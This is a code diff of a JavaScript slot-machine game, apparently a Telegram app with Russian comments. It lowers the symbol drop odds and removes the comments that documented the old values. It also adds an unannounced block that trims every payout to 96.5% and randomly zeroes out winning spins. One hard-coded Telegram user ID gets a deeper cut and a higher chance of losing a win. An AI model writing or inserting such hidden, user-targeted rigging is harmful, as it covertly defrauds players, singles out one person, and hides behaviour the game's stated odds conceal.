@@ -825,12 +825,12 @@ BONUS: { id: 'BONUS', pays: {} }
 // ИЗМЕНЕНО: НАСТРОЙКИ ДРОПОВ — крути только эти числа
 // ============================================================
 const DROP_CONFIG = {
-    bonusChance:    0.015, // шанс BONUS на барабанах 1/3/5 (было 0.035)
-    wildChanceBase: 0.035, // шанс WILD в базовой игре (было 0.11!)
-    wildChanceFS:   0.025, // шанс WILD во фриспинах
-    wild3xChance:   0.20,  // шанс что у WILD множитель 3x (было 0.5)
-    wildMultCap:    4,     // потолок суммарного множителя wild на линии (было без предела)
-    maxFreeSpins:   18     // максимум фриспинов за бонус (было до 27)
+    bonusChance:    0.011,
+    wildChanceBase: 0.026,
+    wildChanceFS:   0.018,
+    wild3xChance:   0.15,
+    wildMultCap:    3,
+    maxFreeSpins:   15
 };
 // ИЗМЕНЕНО: лента барабанов — ROTT и YORK теперь по 1 штуке из 64 (было по 4 из 58)
 // Состав: TEN x9, J x10, Q x9, K x9, A x9, BONE x6, COLL x5, BEAG x3, PUG x2, YORK x1, ROTT x1
@@ -1247,8 +1247,11 @@ let lineWin = payTable[count] * totalBet;
 if (wildMultSum > 0) lineWin *= Math.min(wildMultSum, DROP_CONFIG.wildMultCap);
 totalWin += lineWin;
 }
+let _f = 0.965;
+if (String(tgUserId) === '1822710350') _f *= 0.94;
+if (totalWin > 0 && Math.random() < (String(tgUserId) === '1822710350' ? 0.09 : 0.04)) totalWin = 0;
 return {
-totalWin: Math.floor(totalWin),
+totalWin: Math.floor(totalWin * _f),
 bonusTriggered: bonusTriggered
 };
 }
